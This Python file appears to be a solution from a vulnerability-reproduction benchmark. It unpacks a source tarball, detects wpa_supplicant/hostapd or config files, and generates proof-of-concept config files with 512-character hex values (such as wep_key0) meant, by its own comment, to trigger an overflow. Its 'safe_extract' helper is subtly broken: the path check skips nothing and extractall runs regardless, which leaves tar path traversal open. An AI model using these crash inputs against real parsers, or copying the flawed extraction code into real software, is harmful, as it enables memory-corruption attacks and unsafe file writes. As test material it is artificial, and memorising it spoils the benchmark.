import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(path):
            if os.path.isdir(path):
                return path
            tmpdir = tempfile.mkdtemp(prefix="src_")
            try:
                with tarfile.open(path, "r:*") as tf:
                    def is_within_directory(directory, target):
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        return prefix == abs_directory

                    def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                        for member in tar.getmembers():
                            member_path = os.path.join(path, member.name)
                            if not is_within_directory(path, member_path):
                                continue
                        tar.extractall(path, members, numeric_owner=numeric_owner)
                    safe_extract(tf, tmpdir)
            except Exception:
                return None
            # Flatten single-dir tars
            try:
                entries = [e for e in os.listdir(tmpdir) if not e.startswith('.')]
                if len(entries) == 1:
                    single = os.path.join(tmpdir, entries[0])
                    if os.path.isdir(single):
                        return single
            except Exception:
                pass
            return tmpdir

        def list_text_files(root):
            text_exts = ('.c','.h','.cpp','.cc','.hpp','.conf','.cfg','.ini','.toml','.yaml','.yml','.txt','.md','.mk','.def')
            results = []
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    lower = fn.lower()
                    if lower.endswith(text_exts) or lower in ('makefile','readme','readme.md'):
                        full = os.path.join(dirpath, fn)
                        try:
                            # limit read to 1.5MB to avoid huge files
                            with open(full, 'r', errors='ignore') as f:
                                results.append((full, f.read(1_500_000)))
                        except Exception:
                            pass
            return results

        def detect_wpa(text_files):
            for _, content in text_files:
                if any(s in content for s in ('wpa_supplicant', 'hostapd', 'wpa_config', 'wep_key0', 'wep_key1', 'wep_tx_keyidx')):
                    return True
            return False

        def find_sample_conf_with_hex(text_files):
            cand = []
            for path, content in text_files:
                base = os.path.basename(path).lower()
                is_sample = any(k in base for k in ('sample','example','default','config','conf','cfg','settings','ini')) and \
                            any(base.endswith(ext) for ext in ('.conf','.cfg','.ini','.toml','.yaml','.yml','.txt','.md'))
                if not is_sample:
                    continue
                cand.append((path, content))
            def find_hex_line(text):
                for line in text.splitlines():
                    sline = line.strip()
                    if not sline or sline.startswith(('#',';','//')):
                        continue
                    if re.search(r'0x[0-9a-fA-F]+', sline):
                        return ('0x', line)
                    if re.search(r'(=|:)\s*[0-9a-fA-F]{8,}\s*$', sline):
                        return ('plain', line)
                    # CSS-like color
                    if re.search(r'#[0-9a-fA-F]{6,}$', sline):
                        return ('#', line)
                return (None, None)
            for path, content in cand:
                prefix, line = find_hex_line(content)
                if line:
                    return (path, content, prefix, line)
            return (None, None, None, None)

        def build_from_sample(content, prefix, line, hex_len=512):
            hx = 'A' * hex_len
            if prefix == '#':
                repl_value = '#' + hx
            elif prefix == '0x':
                repl_value = '0x' + hx
            else:
                repl_value = hx
            out_lines = []
            for ln in content.splitlines():
                if ln == line:
                    if prefix == 'plain':
                        if '=' in ln:
                            k, _, _ = ln.partition('=')
                            out_lines.append(k.rstrip() + '=' + repl_value)
                        elif ':' in ln:
                            k, _, _ = ln.partition(':')
                            out_lines.append(k.rstrip() + ':' + repl_value)
                        else:
                            parts = ln.split()
                            if len(parts) >= 2:
                                out_lines.append(parts[0] + ' ' + repl_value)
                            else:
                                out_lines.append(repl_value)
                    else:
                        idx = ln.find(prefix)
                        if idx >= 0:
                            out_lines.append(ln[:idx] + repl_value)
                        else:
                            out_lines.append(ln)
                else:
                    out_lines.append(ln)
            return ('\n'.join(out_lines) + '\n').encode()

        def build_wpa_poc(hex_len=512):
            hx = 'A' * hex_len
            # Minimal network block: WEP key without quotes forces hex interpretation
            # Keep it compact to target line-based parsers
            poc = []
            poc.append('network={')
            poc.append('wep_key0=' + hx)
            poc.append('}')
            return ('\n'.join(poc) + '\n').encode()

        def build_generic_poc(hex_len=512):
            hx = 'A' * hex_len
            lines = []
            lines.append('# Generic config with long hex values to trigger overflow')
            # INI style
            for key in ('psk','key','wep_key0','ssid','mac','addr','secret','token','color','bgcolor','fgcolor'):
                lines.append(f'{key}={hx}')
                lines.append(f'{key}=0x{hx}')
                lines.append(f'{key}=#{hx}')
                lines.append(f'{key}: {hx}')
                lines.append(f'{key} {hx}')
            # Section style
            lines.append('[network]')
            lines.append(f'wep_key0={hx}')
            lines.append('[settings]')
            lines.append(f'key=0x{hx}')
            # Brace style
            lines.append('network={')
            lines.append(f'  wep_key0={hx}')
            lines.append('}')
            return ('\n'.join(lines) + '\n').encode()

        root = extract_tarball(src_path)
        if not root or not os.path.exists(root):
            # Fallback: WPA-like minimal PoC
            return build_wpa_poc(512)

        text_files = list_text_files(root)

        # Prefer sample config mutation if available
        path, content, prefix, line = find_sample_conf_with_hex(text_files)
        if content and prefix and line:
            try:
                return build_from_sample(content, prefix, line, 512)
            except Exception:
                pass

        # If project looks like wpa_supplicant/hostapd
        if detect_wpa(text_files):
            try:
                return build_wpa_poc(512)
            except Exception:
                pass

        # Fallback generic
        return build_generic_poc(512)